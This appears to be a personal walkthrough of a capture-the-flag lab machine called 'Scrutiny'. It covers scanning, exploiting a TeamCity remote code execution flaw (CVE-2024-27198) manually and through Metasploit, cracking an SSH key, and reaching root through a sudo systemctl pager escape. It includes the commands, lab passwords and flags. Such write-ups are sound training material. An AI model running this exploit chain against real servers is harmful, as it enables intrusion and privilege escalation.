# Scrutiny

## Enumeration & scanning

- Open ports are 22, 25 (SMTP Postfix), and 80 (HTTP)
- Port 80 server static page but can reach TeamCity webapp via `login` button. This is using version 2023.05.4 which is [vulnerable](https://www.exploit-db.com/exploits/52411) according to Nuclei.

``` sh
# Standard scanning
sudo nmap -p- 192.168.145.91
sudo nmap -p 22,25,80,443 -A 192.168.145.91
nuclei -target 192.168.145.91
nuclei -target http://teams.onlyrands.com/login.html
```

## Exploitation

- Exploit TeamCity manually to get access to the portal with a newly created user. Exploit TeamCity automatically using Metasploit to get direct shell access. Both are helpful.
- With the manual exploit, browse TeamCity and find commit with comment 'oops' that appears to be an SSH key for user `marcot`. We can crack the password for this key, which appears to be `cheer`.
- We got the flag using the `git` user and used `marcot` for privilege escalation. Could have been done with `git` only, but hard to find the SSH key in the commits using CLI. Need `marcot` user for privilege escalation.

``` sh
# Manual exploit, adjust file for target
python3 52411.py --url http://teams.onlyrands.com 
# Login with newly created user ibrahimsql:ibrahimsql

# Crack SSH key
ssh2john scrutiny_key > scrutiny_key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt scrutiny_key.hash 
# Password: cheer
# Login to user marcot
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o 'IdentitiesOnly=yes' -i ./scrutiny_key marcot@onlyrands.com



# Automated exploit
msfconsole
use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
# Set target. Use lport 80, otherwise doesn't work
exploit
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Get local flag
id
uid=1015(git) gid=1005(git) groups=1005(git)
cat ~/local.txt
0775821ece60d80d61a1df11c975609b
```

## Privilege Escalation

- Check mails for `marcot` user. It contains an mail from `matthewa` with his password: `IdealismEngineAshen476` and says there is a gift to be found.
- Pivot to `matthewa` and find file `.~` with the gift, containing password for user `briand` (admin), being `RefriedScabbedWasting502`.
- Pivot to `briand` and learn that he can execute `systemctl` with `sudo`. This inherits `less`, which can in turn spawn a shell, which will then be `root`.

``` sh
# Check mails, find password for matthewa (IdealismEngineAshen476) and pivot
cat /var/mail/marcot
su matthewa
# Find gift with password for briand (RefriedScabbedWasting502) and pivot
cat /home/.~
su briand
# Check sudo permissions and exploit
sudo -l
sudo /usr/bin/systemctl status teamcity-server.service
!/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/proof.txt
34bdbee2b3f10fd978e6a9e23f65be40
```

## References

- https://gtfobins.org/gtfobins/systemctl/
- https://www.exploit-db.com/exploits/52411
- https://medium.com/@mxnty/hackthebox-runner-medium-by-mxnty-103e3f9094d9
- https://www.rapid7.com/db/modules/exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198/

## Rabbit holes & walkthrough learnings

- Wasted lots of time on the SMTP port since I didn't set the `/etc/hosts/` correctly for the `teams.onlyrands.com` subdomain.
- `marcot` user SSH login says: `You have mail`.
- `systemctl` not always vulnerable to this privilege escalation, requires specific version (<247).
